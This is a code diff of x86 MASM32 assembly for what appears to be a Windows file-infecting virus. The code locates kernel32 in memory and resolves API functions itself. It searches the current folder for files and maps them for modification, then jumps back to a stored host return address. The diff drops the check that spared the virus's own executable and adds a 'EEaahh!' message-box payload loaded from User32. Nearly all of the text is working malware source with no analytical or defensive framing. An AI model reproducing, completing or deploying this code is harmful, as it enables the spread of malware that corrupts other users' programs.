@@ -12,6 +12,7 @@ option casemap:none
       include \masm32\include\windows.inc
       include \masm32\include\wdm.inc
       include \masm32\include\kernel32.inc
+      include \masm32\include\user32.inc
       include .\yharnam.inc
 
       includelib \masm32\lib\kernel32.lib
@@ -26,13 +27,16 @@ data:
 	FindNextFile_str        BYTE "FindNextFileA",0
 	FindClose_str           BYTE "FindClose",0
 	GetFullPathName_str     BYTE "GetFullPathNameA",0
-	lstrcmp_str             BYTE "lstrcmp",0
 	lstrlen_str             BYTE "lstrlen",0
 	CreateFile_str          BYTE "CreateFileA",0
 	CreateFileMapping_str   BYTE "CreateFileMappingA",0
 	MapViewOfFile_str       BYTE "MapViewOfFile",0
 	UnmapViewOfFile_str     BYTE "UnmapViewOfFile",0
 	CloseHandle_str         BYTE "CloseHandle",0
+	LoadLibrary_str         BYTE "LoadLibraryA",0
+	MessageBox_str          BYTE "MessageBoxA",0
+	User32_str              BYTE "User32.dll",0
+	PopUpMessage            BYTE "EEaahh!",0
 	returnAddr              DWORD 000000000h
 
 start:
@@ -74,17 +78,17 @@ loop_find_kernel32:
 	mov bx, [eax]
 	mov di, 'K'
 	cmp bx, 'a' ; check case
-	jl first_letter_cmp
+	jl lfk32_first_letter_cmp
 	add di, ('a' - 'A') ; make lowercase
-first_letter_cmp:
+lfk32_first_letter_cmp:
 	cmp bx, di
 	jne loop_find_kernel32_continue
 	mov bx, [eax + 5 * sizeof WCHAR]
 	mov di, 'L'
 	cmp bx, 'a'
-	jl second_letter_cmp
+	jl lfk32_second_letter_cmp
 	add di, ('a' - 'A')
-second_letter_cmp:
+lfk32_second_letter_cmp:
 	cmp bx, di
 	jne loop_find_kernel32_continue
 	mov ebx, [eax + 6 * sizeof WCHAR]
@@ -164,17 +168,8 @@ loop_find_gpa_end:
 	mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, ecx
 	; store kernel32 base address
 	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
-
-	push esp
-	lea eax, [ebx + (GetModuleFileName_str - data)]
-	push eax
-	call GetProcAddr
-
-	lea edx, (STACK_STORAGE PTR [esp]).currentExe
-	push MAX_PATH
-	push edx
-	push NULL
-	call eax ; GetModuleFileName() / get current .exe full file path
+	; set it as module for GetProcAddress
+	mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, edi
 
 	push esp
 	lea eax, [ebx + (FindFirstFile_str - data)]
@@ -226,19 +221,6 @@ loop_find_file:
 	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
-	je loop_find_file_continue
-
-	push esp
-	lea eax, [ebx + (lstrcmp_str - data)]
-	push eax
-	call GetProcAddr
-	; check if this is the current program
-	lea edx, (STACK_STORAGE PTR [esp]).targetName
-	lea ecx, (STACK_STORAGE PTR [esp]).currentExe
-	push edx
-	push ecx
-	call eax ; lstrcmp()
-	cmp eax, 0
 	je loop_find_file_continue
 
 	; check if it's a read-only file
@@ -436,11 +418,42 @@ loop_find_file_end:
 	mov cx, 4
 	div cx
 	add dx, sizeof STACK_STORAGE
+	mov dx, (STACK_STORAGE PTR [esp]).sizeWithAlignment
 
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
 	je end_of_code
-	add sp, dx ; "free" the stack
+	; get LoadLibraryA
+	push esp
+	lea eax, [ebx + (LoadLibrary_str - data)]
+	push eax
+	call GetProcAddr
+
+	lea edx, [ebx + (User32_str - data)]
+	push edx
+	call eax ; LoadLibrary()
+
+	mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, eax ; so GetProcAddress finds MessageBox
+	; get MessageBoxA
+	push esp
+	lea edx, [ebx + (MessageBox_str - data)]
+	push edx
+	call GetProcAddr
+
+	lea edx, [ebx + (PopUpMessage - data)]
+	push MB_OK
+	push edx
+	push edx
+	push NULL
+	call eax ; MessageBox()
+
+	mov eax, (STACK_STORAGE PTR [esp]).kernel32BaseAddr
+	mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, eax
+
+
+
+	add sp, (STACK_STORAGE PTR [esp]).sizeWithAlignment ; "free" the stack
+	mov eax, [ebx + (returnAddr - data)]
 	jmp eax
 
 ; ret : function address
@@ -453,7 +466,7 @@ GetProcAddr:
 	push eax
 
 	push ecx
-	push (STACK_STORAGE PTR [edx]).kernel32BaseAddr
+	push (STACK_STORAGE PTR [edx]).GetProcAddress_module
 	call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
 	pop edx
 	jmp edx
@@ -560,7 +573,7 @@ lstrncmp_end:
 
 
 end_of_code:
-	add sp, dx ; "free" the stack
+	add sp, (STACK_STORAGE PTR [esp]).sizeWithAlignment ; "free" the stack
 	; hard-coded call, so kernel32 is loaded in the infector
 	push 0
 	call ExitProcess
